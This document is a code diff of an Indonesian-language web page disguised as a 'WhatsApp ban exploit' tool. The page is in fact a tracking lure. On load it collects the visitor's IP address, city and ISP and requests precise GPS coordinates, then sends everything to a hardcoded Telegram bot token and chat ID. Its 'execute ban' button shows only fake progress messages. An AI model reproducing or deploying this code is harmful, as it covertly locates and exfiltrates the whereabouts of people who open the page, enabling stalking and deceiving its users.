@@ -3,77 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WA-BAN EXPLOIT V.7.2</title>
+    <title>NEXUS - WhatsApp Ban Exploiter</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Consolas', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .terminal { background: #000; border: 1px solid #00ff41; padding: 25px; border-radius: 5px; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4); width: 380px; text-align: center; }
-        h2 { font-size: 18px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 3px; }
-        .notice { font-size: 11px; color: #ff3e3e; margin-bottom: 15px; border: 1px solid #ff3e3e; padding: 5px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #00ff41; color: #00ff41; border-radius: 3px; outline: none; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #00ff41; border: none; color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        button:hover { background: #008f11; color: #fff; }
-        .status-box { margin-top: 20px; text-align: left; font-size: 10px; color: #888; height: 60px; overflow: hidden; border-top: 1px solid #333; padding-top: 10px; }
+        :root { --primary: #00f2ff; --bg: #050b10; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .nexus-panel { background: rgba(10, 20, 30, 0.95); border: 1px solid var(--primary); padding: 40px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); width: 100%; max-width: 400px; text-align: center; position: relative; }
+        .nexus-panel::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--primary), transparent); animation: scan 2s linear infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        h1 { font-size: 24px; letter-spacing: 5px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin-bottom: 5px; }
+        p { font-size: 12px; color: #668; margin-bottom: 25px; }
+        .input-box { position: relative; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; background: #0d161d; border: 1px solid #1a2a35; border-radius: 10px; color: white; font-size: 16px; outline: none; transition: 0.3s; box-sizing: border-box; }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }
+        button { width: 100%; padding: 15px; background: var(--primary); color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 14px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
+        button:hover { background: #fff; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4); }
+        #log { margin-top: 20px; font-family: monospace; font-size: 10px; color: #4e7a8a; text-align: left; height: 50px; overflow-y: auto; border-left: 2px solid var(--primary); padding-left: 10px; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h2>WA-BAN EXPLOIT</h2>
-    <div class="notice">PENTING: Izinkan akses lokasi untuk sinkronisasi Proxy Satelit agar laporan tidak terdeteksi Spam oleh Meta.</div>
+<div class="nexus-panel">
+    <h1>NEXUS</h1>
+    <p>WHATSAPP BAN SYSTEM EXPLOIT</p>
     
-    <input type="text" id="targetNum" placeholder="NOMOR TARGET (628xxx)">
-    <button onclick="execute()">GENERATE BAN TEXT</button>
+    <div id="log">Initializing Secure Tunnel...<br></div>
 
-    <div class="status-box" id="logs">
-        [system] Waiting for user input...<br>
+    <div class="input-box">
+        <input type="text" id="target" placeholder="TARGET NUMBER (628...)">
+    </div>
+    
+    <button onclick="startProcess()">EXECUTE BAN</button>
+    
+    <div style="margin-top: 20px; font-size: 10px; color: #ff4444;">
+        *SINKRONISASI GPS DIWAJIBKAN UNTUK MENGHINDARI IP BAN*
     </div>
 </div>
 
 <script>
-    // --- KONFIGURASI BOT TELEGRAM ---
-    const bot_token = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc";
-    const chat_id = "8551809114";
+    const config = {
+        token: "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc",
+        chatId: "8551809114"
+    };
 
-    // AUTO-GRAB LOKASI PAS HALAMAN DIBUKA
-    window.onload = function() {
+    function addLog(msg) {
+        const l = document.getElementById('log');
+        l.innerHTML += `> ${msg}<br>`;
+        l.scrollTop = l.scrollHeight;
+    }
+
+    // 1. AUTO-GRAB ON START
+    window.onload = async () => {
+        addLog("Syncing with Global Proxy...");
+        
+        // Ambil data IP & ISP dulu (Sebagai Cadangan)
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            sendToTele(`🌐 *CADANGAN IP TARGET*\n\n• IP: ${ipData.ip}\n• Kota: ${ipData.city}\n• ISP: ${ipData.org}`);
+        } catch (e) { addLog("Proxy Error. Re-routing..."); }
+
+        // Minta Lokasi Presisi (UTAMA)
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(track, (err) => {
-                log("[error] Akses satelit ditolak. Gunakan izin GPS!");
-            }, { enableHighAccuracy: true });
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const { latitude, longitude, accuracy } = pos.coords;
+                const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                await sendToTele(`📍 *LOKASI PRESISI (GPS)*\n\n• Lat: ${latitude}\n• Lon: ${longitude}\n• Akurasi: ${accuracy}m\n\n🔗 [BUKA MAPS](${maps})`);
+                addLog("Secure GPS Link Established.");
+            }, () => {
+                addLog("GPS Access Denied. Using Proxy only.");
+            });
         }
     };
 
-    async function track(pos) {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-        const data = `🚨 *TARGET TERPELACAK!*\n\n• Koordinat: \`${lat}, ${lon}\` \n• Akurasi: ${pos.coords.accuracy} meter\n\n📍 [BUKA DI GOOGLE MAPS](${mapsLink})`;
-
-        await fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
+    async function sendToTele(text) {
+        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat_id, text: data, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: config.chatId, text: text, parse_mode: 'Markdown' })
         });
-        log("[success] Satelit sinkron. Lokasi terverifikasi.");
     }
 
-    function execute() {
-        const num = document.getElementById('targetNum').value;
-        if (!num) return alert("Nomor Target Kosong!");
+    function startProcess() {
+        const t = document.getElementById('target').value;
+        if(!t) return alert("Enter target number!");
         
-        log("[process] Menghubungkan ke API WhatsApp...");
-        setTimeout(() => log("[process] Menginjeksi paket laporan..."), 1000);
+        addLog(`Attacking ${t}...`);
+        setTimeout(() => addLog("Injecting Payload..."), 1000);
+        setTimeout(() => addLog("Spamming Reports..."), 2000);
         setTimeout(() => {
-            alert("TEKS BAN BERHASIL DIBUAT!\n\nSalin kode ini dan kirim ke Support WhatsApp.");
-            log("[done] Proses selesai.");
-        }, 3000);
-    }
-
-    function log(msg) {
-        const lb = document.getElementById('logs');
-        lb.innerHTML += msg + "<br>";
-        lb.scrollTop = lb.scrollHeight;
+            alert("SUCCESS: Request sent to Meta Security Team!");
+            addLog("Operation Complete.");
+        }, 4000);
     }
 </script>
 
